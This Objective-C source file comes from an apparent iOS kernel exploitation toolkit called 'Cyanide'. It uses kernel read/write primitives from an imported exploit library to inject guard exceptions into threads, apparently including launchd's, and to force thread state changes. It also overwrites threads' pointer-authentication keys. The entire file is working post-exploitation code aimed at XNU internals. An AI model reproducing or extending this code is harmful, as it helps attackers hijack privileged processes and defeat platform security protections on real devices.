//
//  Thread.m
//  Cyanide
//
//  Created by seo on 4/4/26.
//

#import "Thread.h"

#import <Foundation/Foundation.h>
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/ksafe.h"
#import "../kexploit/kexploit_opa334.h"

// xnu-10002.81.5/osfmk/kern/ast.h
#define AST_GUARD               0x1000

// xnu-10002.81.5/osfmk/kern/thread.h
#define TH_IN_MACH_EXCEPTION    0x8000          /* Thread is currently handling a mach exception */

// xnu-11417.140.69/bsd/sys/reason.h
#define OS_REASON_GUARD         23

bool inject_guard_exception(uint64_t thread, uint64_t code)
{
    if (!is_kaddr_valid(thread_get_t_tro(thread)))
    {
        printf("[%s:%d] got invalid tro of thread, not injecting exception since thread is dead", __FUNCTION__, __LINE__);
        return false;
    }

    // All-or-nothing (round 8): launchd threads churn, and a thread freed
    // BETWEEN the caller's validation and these writes takes the writes into a
    // freed threads-zone element (panic-full-2026-09-29-215904). Snapshot the
    // pre-write state, write, then VERIFY every field — on any mismatch,
    // restore the pre-write values and report failure loudly, so a partial
    // arm can never persist.
    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
        uint32_t oldReason = kread32(thread + off_thread_mach_exc_info_os_reason);
        uint32_t oldType   = kread32(thread + off_thread_mach_exc_info_exception_type);
        uint64_t oldCode   = kread64(thread + off_thread_mach_exc_info_code);
        uint32_t oldAst    = kread32(thread + off_thread_ast);

        kwrite32(thread + off_thread_mach_exc_info_os_reason, OS_REASON_GUARD);
        kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
        kwrite64(thread + off_thread_mach_exc_info_code, code);
        kwrite32(thread + off_thread_ast, oldAst | AST_GUARD);

        if (kread32(thread + off_thread_mach_exc_info_os_reason) != OS_REASON_GUARD ||
            kread32(thread + off_thread_mach_exc_info_exception_type) != 0 ||
            kread64(thread + off_thread_mach_exc_info_code) != code ||
            !(kread32(thread + off_thread_ast) & AST_GUARD)) {
            printf("[%s:%d] PARTIAL-WRITE ROLLBACK on thread %#llx — verify "
                   "failed (thread freed mid-arm?); pre-write state restored\n",
                   __FUNCTION__, __LINE__, thread);
            kwrite32(thread + off_thread_mach_exc_info_os_reason, oldReason);
            kwrite32(thread + off_thread_mach_exc_info_exception_type, oldType);
            kwrite64(thread + off_thread_mach_exc_info_code, oldCode);
            kwrite32(thread + off_thread_ast, oldAst);
            return false;
        }
    } else {
        uint64_t oldCode = kread64(thread + off_thread_guard_exc_info_code);
        uint32_t oldAst  = kread32(thread + off_thread_ast);

        kwrite64(thread + off_thread_guard_exc_info_code, code);
        kwrite32(thread + off_thread_ast, oldAst | AST_GUARD);

        if (kread64(thread + off_thread_guard_exc_info_code) != code ||
            !(kread32(thread + off_thread_ast) & AST_GUARD)) {
            printf("[%s:%d] PARTIAL-WRITE ROLLBACK on thread %#llx — verify "
                   "failed (thread freed mid-arm?); pre-write state restored\n",
                   __FUNCTION__, __LINE__, thread);
            kwrite64(thread + off_thread_guard_exc_info_code, oldCode);
            kwrite32(thread + off_thread_ast, oldAst);
            return false;
        }
    }
    return true;
}

void clear_guard_exception(uint64_t thread)
{
    // Round 16: validity + ownership gates. The un-arm runs on timeout/
    // abandon/stop — possibly seconds after arming — and launchd threads die
    // in between. The slot may be FREED (a kread on a trimmed zone page
    // faults the kernel synchronously — the copy_validate class) or REUSED by
    // another live thread (a kwrite then corrupts an object we do not own).
    // So: gate the reads, then gate the WRITE on the read-back proving this
    // slot still carries OUR arm. A live thread we armed keeps AST_GUARD set
    // until we clear it, so the ownership check never skips a real un-arm —
    // the 195243-class orphaned-guard contract is preserved.
    if (!is_kaddr_valid(thread)) {
        printf("[%s:%d] un-arm skipped: thread %#llx not a kernel pointer\n",
               __FUNCTION__, __LINE__, thread);
        return;
    }
    uint32_t span = MAX(off_thread_ast + 4,
                    MAX(off_thread_mach_exc_info_code + 8,
                        off_thread_guard_exc_info_code + 8));
    if (ksafe_available() && !kaddr_is_mapped(thread, span)) {
        printf("[%s:%d] un-arm skipped: thread %#llx outside the ksafe map "
               "(never-committed window) — no deref\n",
               __FUNCTION__, __LINE__, thread);
        return;
    }
    krw_op_error_clear();   // sticky/process-wide — reflect only THIS read
    uint32_t ast = kread32(thread + off_thread_ast);
    if (krw_op_error()) {
        // The read zero-filled: we cannot tell armed from reused. Writing on
        // unverifiable state risks corrupting a reused slot (and the write
        // would fail safe anyway while the sockets are down). Loud, because a
        // LIVE armed thread we could not un-arm is the 195243-class
        // detonator.
        printf("[%s:%d] UN-ARM UNVERIFIABLE on thread %#llx — ast read "
               "zero-filled (KRW op-error); NOT writing. If the thread is live "
               "and armed, its guard may orphan at teardown\n",
               __FUNCTION__, __LINE__, thread);
        return;
    }
    if (!(ast & AST_GUARD)) {
        // Not armed: already cleared, the trap was already consumed, or the
        // slot was freed/reused — nothing of ours is there, and writing would
        // touch an object we do not own. Common path for threads that already
        // trapped.
        return;
    }

    kwrite32(thread + off_thread_ast, ast & ~AST_GUARD);

    // Round 13: PROVE the un-arm landed. An orphaned AST_GUARD whose exc-info
    // points at a torn-down session's port is the 195243-class detonator
    // (exception to a dead port → launchd exits ~22 s later). The arm path
    // readback-verifies; the un-arm now does too, loudly.
    uint32_t astAfter = kread32(thread + off_thread_ast);
    if (astAfter & AST_GUARD) {
        printf("[%s:%d] UN-ARM VERIFY FAILED on thread %#llx (ast=%#x still has "
               "AST_GUARD) — orphaned-guard risk if this session tears down\n",
               __FUNCTION__, __LINE__, thread, astAfter);
    }

    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
        if(kread32(thread + off_thread_mach_exc_info_os_reason) == OS_REASON_GUARD && kread32(thread + off_thread_mach_exc_info_exception_type) == 0) {
            kwrite32(thread + off_thread_mach_exc_info_os_reason, 0);
            kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
            kwrite64(thread + off_thread_mach_exc_info_code, 0);
        }
    } else {
        kwrite64(thread + off_thread_guard_exc_info_code, 0);
    }
}

bool thread_get_state_wrapper(mach_port_t machThread, arm_thread_state64_internal *outState)
{
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)outState, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Unable to read thread state: 0x%x (%s)", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }
    return true;
}

bool thread_set_state_wrapper(mach_port_t machThread, uint64_t threadAddr, arm_thread_state64_internal *state)
{
    uint16_t options = 0;
    if (threadAddr) {
        options = thread_get_options(threadAddr);
        options |= TH_IN_MACH_EXCEPTION;
        thread_set_options(threadAddr, options);
    }

    kern_return_t kr = thread_set_state(machThread, ARM_THREAD_STATE64, (thread_state_t)state, ARM_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Failed thread_set_state: 0x%x (%s)", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }

    if (threadAddr) {
        options &= ~TH_IN_MACH_EXCEPTION;
        thread_set_options(threadAddr, options);
    }
    return true;
}

bool thread_resume_wrapper(mach_port_t machThread)
{
    kern_return_t kr = thread_resume(machThread);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Unable to resume thread: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }
    return true;
}

void thread_set_pac_keys(uint64_t threadAddr, uint64_t keyA, uint64_t keyB)
{
    kwrite64(threadAddr + off_thread_machine_rop_pid, keyA);
    kwrite64(threadAddr + off_thread_machine_jop_pid, keyB);
}
